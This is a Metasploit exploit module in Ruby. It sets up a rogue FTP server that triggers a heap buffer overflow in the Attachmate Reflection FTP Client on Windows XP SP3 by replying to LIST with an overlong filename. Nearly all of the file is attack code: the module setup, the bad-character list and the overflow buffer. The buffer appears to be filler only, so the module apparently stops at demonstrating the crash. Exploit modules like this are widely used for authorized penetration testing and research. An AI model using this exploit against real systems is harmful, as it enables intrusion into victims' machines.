
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::FtpServer

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Attachmate Reflection FTP Client Heap Overflow (LIST)',
			'Description'    => %q{
					This module exploits an heap buffer overflow in Attachmate Reflection FTP Client,
				triggered when processing the response on a LIST command.
			},
			'Author' 	 =>
				[
					'Francis Provencher',		
				],
			'License'        => MSF_LICENSE,
			'Version'        => "$Revision: 12196 $",
			'References'     =>
				[
					[ 'URL', 'http://www.protekresearchlab.com/' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Payload'        =>
				{
					'BadChars' => "\x00\xff\x0d\x5c\x2f\x0a",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'XP SP3 Universal', { 'Offset' => 300, } ],
				],
			'Privileged'     => false,
			'DisclosureDate' => 'November 16 2011',
			'DefaultTarget'  => 0))

	end

	def setup
		super
	end

	def on_client_unknown_command(c,cmd,arg)
		c.put("200 OK\r\n")
	end

	def on_client_command_list(c,arg)

		conn = establish_data_connection(c)
		if(not conn)
			c.put("425 Can't build data connection\r\n")
			return
		end
		print_status(" - Data connection set up")
		code = 150
		c.put("#{code} Here comes the directory listing.\r\n")
		code = 226
		c.put("#{code} Directory send ok.\r\n")

		filename = "A" * 296

		junk = "DCBA"

		buffer = filename + junk 
		print_status(" - Sending directory list via data connection")
		dirlist = "-rw-rw-r--    1 1176     1176         1060 sep 27 22:22 #{buffer}\r\n"
		conn.put(dirlist)
		conn.close
		print_status(" Movzx eax, byte ptr edx ds:0023:41424344  ...")
		return

	end

end